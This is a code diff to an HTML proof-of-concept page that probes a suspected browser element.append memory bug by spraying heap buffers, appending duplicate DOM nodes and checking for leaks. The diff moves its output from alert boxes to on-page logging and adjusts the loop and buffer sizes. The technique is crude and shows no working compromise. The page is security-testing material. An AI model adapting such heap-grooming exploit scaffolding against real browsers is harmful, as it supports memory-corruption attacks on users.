@@ -17,17 +17,23 @@
         #trigger:hover {
             background-color: #d32f2f;
         }
+        #output {
+            margin: 20px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
     </style>
 </head>
 <body>
     <h1>DOM Append PoC</h1>
     <p>Click to test element.append vulnerability</p>
     <button id="trigger">Trigger Exploit</button>
+    <div id="output"></div>
     <script>
         function stressHeap() {
             const buffers = [];
             for (let i = 0; i < 50; i++) {
-                const buf = new Uint8Array(16 * 1024);
+                const buf = new Uint8Array(8 * 1024);
                 buf.fill(0x41);
                 buffers.push(buf);
             }
@@ -40,36 +46,43 @@
             return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
         }
 
+        function log(message) {
+            const output = document.getElementById('output');
+            output.textContent += message + '\n';
+        }
+
         function triggerExploit() {
-            alert('Grooming heap...');
+            log('Grooming heap...');
             stressHeap();
 
-            alert('Creating parent and elements...');
+            log('Creating parent and elements...');
             const parent = document.createElement('div');
             const x = document.createElement('x');
             const y = document.createElement('y');
 
-            alert('Appending duplicate elements...');
-            for (let i = 0; i < 100; i++) {
+            log('Appending duplicate elements...');
+            for (let i = 0; i < 1000; i++) {
                 parent.append(x, y, x);
-                const leak = checkMemoryLeak();
-                if (leak) {
-                    alert(leak);
+                if (i % 100 === 0) {
+                    const leak = checkMemoryLeak();
+                    if (leak) {
+                        log(leak);
+                    }
                 }
             }
 
-            alert('Checking parent child nodes...');
+            log('Checking parent child nodes...');
             if (parent.childNodes.length !== 2 || parent.childNodes[0] !== y || parent.childNodes[1] !== x) {
-                alert(`Unexpected DOM state: ${parent.childNodes.length} nodes`);
+                log(`Unexpected DOM state: ${parent.childNodes.length} nodes`);
             } else {
-                alert('DOM state as expected');
+                log('DOM state as expected');
             }
 
             const leak = checkMemoryLeak();
             if (leak) {
-                alert(leak);
+                log(leak);
             } else {
-                alert('No memory changes detected');
+                log('No memory changes detected');
             }
         }
 
